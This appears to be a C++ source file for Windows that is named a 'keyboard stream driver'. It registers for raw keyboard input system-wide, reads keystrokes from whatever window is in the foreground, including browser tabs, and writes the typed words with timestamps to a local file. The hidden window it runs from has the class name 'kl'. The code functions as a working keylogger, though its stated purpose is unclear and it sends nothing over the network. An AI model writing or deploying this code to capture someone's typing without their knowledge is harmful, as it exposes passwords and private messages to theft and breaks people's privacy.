// Keyboard stream driver

#include <fstream>
#include <string>
#include <map>
#include <windows.h>
#include <time.h>

#include "KeySet.h"

using namespace std;

LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);

HKL layout;
SYSTEMTIME wordBegin, wordEnd;
HWND hWnd, activeTab = NULL;
RAWINPUTDEVICE rid;
string CurrentWord("");
map<WCHAR, string> keymap;
string released("released"), pressed("pressed");

string utf8_encode(const wstring &wstr)
{
	int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
	string strTo(size_needed, 0);
	WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
	return strTo;
}

string keys()
{
	string keyChar, v, res;
	WCHAR k;
	for (map<WCHAR, string>::iterator iter = keymap.begin(); iter != keymap.end(); ++iter)
	{
		// TODO: convert WCHAR to string
		k = iter->first;
		v = iter->second;
		keyChar = utf8_encode(wstring((WCHAR*)&k));
		if (v.compare(released)) res = res + keyChar;
	}
	return res;
}

void flushWord()
{
	ofstream wordsFile;
	GetSystemTime(&wordEnd);
	union { FILETIME a; long long b; } begin, end;
	SystemTimeToFileTime(&wordBegin, &begin.a);
	SystemTimeToFileTime(&wordEnd, &end.a);

	wordsFile.open("WordsStream.txt", ios::out | ios::binary | ios::app);
	wordsFile << "Word," 
					  << begin.b << "," 
    			      << end.b-begin.b << ","
		              << CurrentWord << "\r\n";
	GetSystemTime(&wordBegin);
	CurrentWord = "";
}

BOOL CALLBACK EnumChild(HWND hwnd, LPARAM lParam) // Chrome and IE browser support
{
	WCHAR className[50];
	if (IsWindowVisible(hwnd) &&
		GetClassName(hwnd, className, 50) > 0 &&
		wcscmp(className, L"TabWindowClass") == 0)
	{
		*reinterpret_cast<HWND*>(lParam) = hwnd;
		return FALSE;
	}
	return TRUE;

}

LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	switch (message) {
	case WM_CREATE: {
		// register interest in raw data
		rid.dwFlags = RIDEV_NOLEGACY | RIDEV_INPUTSINK;	// ignore legacy messages and receive system wide keystrokes	
		rid.usUsagePage = 1;							// raw keyboard data only
		rid.usUsage = 6;
		rid.hwndTarget = hWnd;
		RegisterRawInputDevices(&rid, 1, sizeof(rid));
		break;
	}
	case WM_INPUT:
	{
		UINT dwSize;

		if (GetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &dwSize, sizeof(RAWINPUTHEADER)) == -1)
		{
			break;
		}
		LPBYTE lpb = new BYTE[dwSize];
		if (lpb == NULL){
			break;
		}
		if (GetRawInputData((HRAWINPUT)lParam, RID_INPUT, lpb, &dwSize, sizeof(RAWINPUTHEADER)) != dwSize)
		{
			delete[] lpb;
			break;
		}

		PRAWINPUT raw = (PRAWINPUT)lpb;
		UINT Event, key;
		BYTE* keyboard = new BYTE[256];
		WCHAR _String[3];

		HWND foreWin = GetForegroundWindow();
		activeTab = NULL;
		EnumChildWindows(foreWin, EnumChild, reinterpret_cast<LPARAM>(&activeTab));
		DWORD threadId = GetWindowThreadProcessId(activeTab == NULL ? foreWin : activeTab, NULL);
		layout = GetKeyboardLayout(threadId);

		Event = raw->data.keyboard.Message;
		key = raw->data.keyboard.VKey;

		GetKeyboardState(&keyboard[0]);
		ToUnicodeEx(key, MapVirtualKeyEx(key, 0, layout), &keyboard[0], &_String[0], 1, 0, layout);
		WCHAR keyChar = _String[0];

		delete[] lpb;

		if (Event == WM_KEYDOWN) {

			if (keyChar <= 32) {
				flushWord();
				break;
			}

			string keyString = utf8_encode(wstring((WCHAR*)&keyChar));
			if (!CurrentWord.compare("")) GetSystemTime(&wordBegin);
			CurrentWord = CurrentWord + keyString;
		}

		if (Event == WM_KEYDOWN) { keymap[keyChar] = pressed; }
		else if (Event == WM_KEYUP) keymap[keyChar] = released;

		break;
	}
	case WM_CLOSE:
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
	}
	return 0;
}


int KeySetConnect()
{
	WNDCLASS wc = { 0 };
	unsigned long mindReadSize = 0;

	wc.lpfnWndProc = WndProc;
	wc.hInstance = instance;
	wc.lpszClassName = L"kl";

	RegisterClass(&wc);
	hWnd = CreateWindow(wc.lpszClassName, NULL, 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, instance, NULL);

	return 0;

}

DWORD WINAPI KeySetTurnOn(LPVOID lpParam)
{
	BOOL bRet;
	MSG msg = { 0 };

	KeySetConnect();

	while ((bRet = GetMessage(&msg, hWnd, 0, 0)) != 0){
		if (bRet == -1){
			return bRet;
		}
		else{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}

}
